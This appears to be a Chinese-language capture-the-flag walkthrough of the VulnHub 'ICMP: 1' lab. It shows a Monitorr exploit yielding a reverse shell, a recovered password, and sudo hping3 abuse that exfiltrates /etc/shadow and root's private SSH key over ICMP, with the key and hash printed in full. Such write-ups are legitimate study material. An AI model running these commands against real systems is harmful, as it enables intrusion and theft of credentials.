# ICMP: 1

2024-5-24 https://www.vulnhub.com/entry/icmp-1,633/

difficulty: Easy

## IP

192.168.5.29

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 deb52389bb9fd41ab50453d0b75cb03f (RSA)
|   256 160914eab9fa17e945395e3bb4fd110a (ECDSA)
|_  256 9f665e71b9125ded705a4f5a8d0d65d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-title:             Monitorr            | Monitorr
|_Requested resource was http://192.168.5.29/mon/
|_http-server-header: Apache/2.4.38 (Debian)
```

直接看 80，直接跳到了 http://192.168.5.29/mon/ 看底部 banner 显示 : Monitorr | 1.7.6m

找到了对应的漏洞利用 https://www.exploit-db.com/exploits/48980

先在 kali 上监听 8888 端口，在执行 exp：

```
python 48980.py http://192.168.5.29/mon/ 192.168.5.3 8888
```

得到了反弹的 shell，先升级 tty:

```
www-data@icmp:/var/www/html/mon/assets/data/usrimg$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

发现 user flag：

```
www-data@icmp:/home/fox$ ls -al
total 20
drwxr-xr-x 3 root root 4096 Dec  3  2020 .
drwxr-xr-x 3 root root 4096 Dec  3  2020 ..
lrwxrwxrwx 1 root root    9 Dec  3  2020 .bash_history -> /dev/null
drwx--x--x 2 fox  fox  4096 Dec  3  2020 devel
-rw-r--r-- 1 fox  fox    33 Dec  3  2020 local.txt
-rw-r--r-- 1 root root   78 Dec  3  2020 reminder
www-data@icmp:/home/fox$ cat local.txt
c9db6c88939a2ae091c431a45fb1e59c
```

同目录下看到提示：

```
www-data@icmp:/home/fox$ cat reminder
crypt with crypt.php: done, it works
work on decrypt with crypt.php: howto?!?
```

/home/fox 目录中 有一个 devel 文件夹，但是没有权限读取目录内容，上面 remminder 中提示的 crypt.php 可能就在这个里面，尝试找找看看：

```
www-data@icmp:/home/fox$ ls -al devel/crypt.php
-rw-r--r-- 1 fox fox 56 Dec  3  2020 devel/crypt.php
```

确实存在，看看什么内容：

```
cat devel/crypt.php

<?php
echo crypt('BUHNIJMONIBUVCYTTYVGBUHJNI','da');
?>

```

像是个密码，能不能是 fox 用户的，尝试 su 切换看看，切换成功。

sudo -l 发现：

```
(root) /usr/sbin/hping3 --icmp *
(root) /usr/bin/killall hping3
```

可以用 hping3 读取 /etc/shadow 文件：

```
用fox ssh在登陆一个窗口，在目标机器上监听
sudo hping3 --icmp 127.0.0.1 --listen xxx --dump

目标机器上执行：
sudo -u root hping3 --icmp 127.0.0.1 --data 500 --sign xxx --file /etc/shadow
```

得到了 root 的密码：

```
root:$6$oQmI05Mhd8VholPo$geuaT1GPdPM8tVjff2KEyPTc67LjyO.VR/P3d0/wzdpPAZ0Bpx.ICNIHQH8Brtr.1L.IzDzl.lwSSfb6cxxkT1:18599:0:99999:7:::
```

john + rockyou 没有破解出明文密码。

/root 中有.ssh，里面有私钥文件，尝试读取这个吧

```
fox@icmp:/root/.ssh$ ls -al
total 24
drwxr-xr-x 2 root root 4096 Nov  4  2020 .
drwxr-xr-x 3 root root 4096 Dec  3  2020 ..
-rw-r--r-- 1 root root  563 Nov  4  2020 authorized_keys
-rw------- 1 root root 2602 Nov  4  2020 id_rsa
-rw-r--r-- 1 root root  563 Nov  4  2020 id_rsa.pub
-rw-r--r-- 1 root root  222 Oct 27  2020 known_hosts
```

data 要定义的大一点，否则数据读取不全：

```
sudo -u root hping3 --icmp 127.0.0.1 --data 10000 --sign xxx --count 1 --file /root/.ssh/id_rsa
```

得到私钥：

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAqcCz/pKzjVNZi9zdKJDkvhMhY8lOb2Qth8e/3bLJ/ssgmRLoJXAQ
sGF3lKw7MFJ4Kl6mrbod2w8EMfULTjW6OhwZ8txdNmTDkbof4irIm93oQgrqMy8/2GwF/k
Sf84k8Yem6gRUhDDnYcKLF2Q2mBJW9WRSDImYVkZX8n/30GrUpHN7cVGCsKsuTxfZI4n3E
fj90y0zlpUgtpdVAtOcYfhR6tXsuoKfPCD8H0N/0XEKVAHaQGWkL/EAGQqPuqGMTGLv62y
lL8bpVdeAaol6aJdxAT3aglxOcuhdgHFAPVHeojGtIaNmpiPq0fIWZtV3gJiSRum7GBGUR
+aWhN6ZEnn7WuOuOjibtULNadnIEyPP7xplEcoHWeeDvM060MtLx1ojv8eg23bAvd/ppsy
UiOw2/AJGd5HnRH9yFZCXzJ+bga6oV2SH95B/pfBc0sKD5In/r4CFW+NTUH5Z3iX2dQZdo
QnKiZjKK4aAsLcjLX3VzANr7WO6RLanxAffL0xFxAAAFiEC+3VBAvt1QAAAAB3NzaC1yc2
EAAAGBAKnAs/6Ss41TWYvc3SiQ5L4TIWPJTm9kLYfHv92yyf7LIJkS6CVwELBhd5SsOzBS
eCpepq26HdsPBDH1C041ujocGfLcXTZkw5G6H+IqyJvd6EIK6jMvP9hsBf5En/OJPGHpuo
EVIQw52HCixdkNpgSVvVkUgyJmFZGV/J/99Bq1KRze3FRgrCrLk8X2SOJ9xH4/dMtM5aVI
LaXVQLTnGH4UerV7LqCnzwg/B9Df9FxClQB2kBlpC/xABkKj7qhjExi7+tspS/G6VXXgGq
JemiXcQE92oJcTnLoXYBxQD1R3qIxrSGjZqYj6tHyFmbVd4CYkkbpuxgRlEfmloTemRJ5+
1rjrjo4m7VCzWnZyBMjz+8aZRHKB1nng7zNOtDLS8daI7/HoNt2wL3f6abMlIjsNvwCRne
R50R/chWQl8yfm4GuqFdkh/eQf6XwXNLCg+SJ/6+AhVvjU1B+Wd4l9nUGXaEJyomYyiuGg
LC3Iy191cwDa+1jukS2p8QH3y9MRcQAAAAMBAAEAAAGAAiBk4NqLn0idBZCFwL1X8D2jHH
HoJqMVou7Qq4FS4HtA9En1WIq32s3NxrIFp8xQrw8yfVioiRb+EXYlZxxrMdEqTg2OqWDH
xmqTfazViIZWI4Wpe2yrGxX3WUEY098zP3LDIFzYZiPPX1HasqZmHwaVMal9HxAyUvmTCZ
oP1cnRMwhjsDbp0TttpXw5W4UB0icPWoCjG9f0onAyeFGwz9uH0gAyDFct08eeXHKByCoZ
XcEeewMC4G0Y5vrQwZFEJcEP7+FES0RHCT8itoeC51t4HOtHLX5BKcApf8cAp3LK8alEl3
lJfLklX2Rm8v9l4RjWxxAgFpmY5o4PeXLeKP6/35VewAmMwNiZ17J/MOUMsj/2SCNxYh7Z
LmIIL9B65ipd/L7RXSbFhpGbT6jyOYzDI8D6VGwCEhMiVITntyh5YvimgZTzlP3zmTsxX5
lmyAn/RIJ6tXnXIkmGw1QjHfS0eI5ny+vR8SlmDnTlF1LFk65+qY42sWWeVweP4tkxAAAA
wDvG1aNPq532hZw+P5NzrocyRSu4GfmygSpZY13OTtKGPDjQMPwABPYFOYS/cul0i9mpS1
SeBllnDJbEwM3/iH6k/YlEuT7tIKeRbx/8MTAjkCO0sBWyA4k3tFbupsZu2/jWOxrcUgeH
1833FdCX/EyAzBDirDopqYmR77SDERqOYLbwgv6r2J6rj4FboRemx2T1XRo+DJOczlU0yJ
vTKQRbCFe3+Z5ZYkMg3SCvMsbu1vj+f9pu0uG84s3R3FFGYAAAAMEA0aLIF8pXABXUD+60
bIXpizYMoodJHl02C17wBjMWVzEYah6Vq+ZvoOvqMISkeIIhDUf8jwgaFVYkv/Nr33qmSN
FsEms4d8vJ9c8MFWykmxvmSwVh26G0DQxlASZ3exgyqmnCl9LSGwY0W4brH6nOrKRBKDTH
xeMBxuxNdkfU6ABy5NbrSmMnQP/bLozC1GJlyB4TAvvK/PH29L8ncSzsx9KimV4eM3fv1j
5x+VwcOnMnbzg8F1RrA5O6xJfYMnQVAAAAwQDPS88AHHxqwqg2LocOLQ6AVyqDB6IRDiDV
mI4KG5dALS8EnHGmObVhx6qiwi09X666eDen2G/W1bVc8X9lyJVVtKEdOhLrizkPAqY3wW
9V/kC7S2DX0aDYpVyZTSpeV63SPHCrN1jryAQMMgz+CswS7/sIqEUAPNqMAxzoziR3WBIG
qEx5FmhFueiELGZjVJiEPAWbbsFRdskr4eYfhJ+bz91G5aJXpIJqsNw829TOXf/3439Rix
q/qSihL6WLsu0AAAAQcm9vdEBjYWxpcGVuZHVsYQECAw==
-----END OPENSSH PRIVATE KEY-----
```

root 登陆 ssh，得到最后的 flag：

```
root@icmp:~# id
uid=0(root) gid=0(root) groups=0(root)
root@icmp:~# ls -al
total 36
drwxr-xr-x  3 root root 4096 Dec  3  2020 .
drwxr-xr-x 18 root root 4096 Dec  3  2020 ..
lrwxrwxrwx  1 root root    9 Dec  3  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root   84 Nov  4  2020 .google_authenticator
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root   33 Dec  3  2020 proof.txt
drwxr-xr-x  2 root root 4096 Nov  4  2020 .ssh
-rw-------  1 root root  937 Dec  3  2020 .viminfo
-rw-r--r--  1 root root  209 Dec  3  2020 .wget-hsts
root@icmp:~# cat proof.txt
9377e773846aeabb51b37155e15cf638
```
